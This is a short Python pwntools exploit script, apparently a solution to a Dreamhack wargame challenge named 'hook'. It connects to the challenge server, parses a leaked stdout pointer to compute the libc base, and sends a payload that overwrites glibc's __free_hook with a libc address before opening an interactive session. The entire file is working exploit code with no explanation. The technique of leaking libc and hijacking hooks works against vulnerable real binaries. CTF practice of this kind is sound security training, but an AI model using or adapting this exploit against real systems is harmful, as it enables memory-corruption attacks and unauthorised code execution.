from pwn import *

p = remote("host3.dreamhack.games",8352)
e = ELF("./hook")
libc = ELF("./libc-2.23.so")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline(),16)
libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
hook = libc_base + libc.symbols["__free_hook"]
printf = libc_base+0x55810
print(hex(libc_base))

p.sendline(b"16")

payload = p64(hook) + p64(printf) + p64(printf)
p.sendlineafter(b"Data: ", payload)
p.interactive()